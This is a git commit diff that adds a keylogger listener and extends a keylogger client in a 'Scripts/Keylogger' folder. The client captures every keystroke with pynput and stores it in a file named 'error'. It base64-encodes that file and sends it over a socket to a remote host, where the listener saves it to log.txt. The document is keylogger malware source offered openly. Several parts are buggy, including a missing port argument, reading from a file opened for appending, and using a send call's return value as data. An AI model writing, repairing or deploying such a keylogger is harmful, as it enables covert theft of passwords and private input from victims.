c1cc165a8e7c1a6d06b33f79b009475677abd5c7
Ergin <ergintren13@gmail.com>
2023-01-26 21:16:30 +0300

    update

---
+++ Scripts/Keylogger/keyloggerlistener.py
@@ -0,0 +1,51 @@
+import socket
+import base64
+import simplejson
+import time
+
+class Listen():
+
+    def __init__(self,ip,port):
+        my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+        my_listener.bind((f"{ip}",port))
+        my_listener.listen(0)
+        print("listening")
+        (self.my_connection,my_address) = my_listener.accept()
+        print("connection")
+    
+    def save_file(self,content):
+        with open("log.txt","a") as file:
+            file.write(base64.b64decode(content))
+
+    def json_send(self,data):
+        json_data = simplejson.dumps(data).encode("utf-8")
+        self.my_connection.send(json_data)	
+	
+    def json_recv(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.my_connection.recv(1024).decode()
+                return simplejson.loads(json_data)
+            except ValueError:
+                continue
+    
+    def Save_log(self):
+        while True:
+            command = '1'
+            output = self.json_send(command)
+            if command == '1':
+                self.save_file(output)
+            elif command == '2':
+                exit()
+            time.sleep(10)
+
+a = Listen("10.0.2.4")
+a.Save_log()
+            
+
+                
+    
+    
+    
--- Scripts/Keylogger/keyloggersocket.py
+++ Scripts/Keylogger/keyloggersocket.py
@@ -1,6 +1,8 @@
 import socket
 import pynput.keyboard as ky
 import time
+import base64
+import simplejson
 
 log = ""
 
@@ -13,22 +15,50 @@ class Keylog():
         global log
         try:
             log = log + str(key.char)
+            print(log)
         except AttributeError:
             if key == key.space:
                 log = log + " "
             else:
                 log = log + str(key)
     
-    def save_log(self):
-        global log
+    def save_log(self,content):
         with open("error","a") as file:
-            file.write(log)
+            file.write(content)
     
     def log_listen(self):
         keylog = ky.Listener(on_press=self.callback)
         with keylog:
-            self.save_log()
             keylog.join()
 
+    def content_logfile(self):
+        with open("error","a") as file:
+            return base64.b64encode(file.read())
+    
+    def json_send(self,data):
+        json_data = simplejson.dumps(data).encode("utf-8")
+        self.connection.send(json_data)
+
+    def json_recv(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024).decode()
+                return simplejson.loads(json_data)
+            except ValueError:
+                continue
+
+    def Send_log(self):
+        global log
+        while True:
+            self.save_log(log)
+            command = self.json_recv()
+            self.log_listen()
+            if command == '1':
+                output = self.content_logfile()
+                self.json_send(output)
+            elif command == '2':
+                exit()
+    
 listen = Keylog("1.1.1.1",8080)
 listen.log_listen()
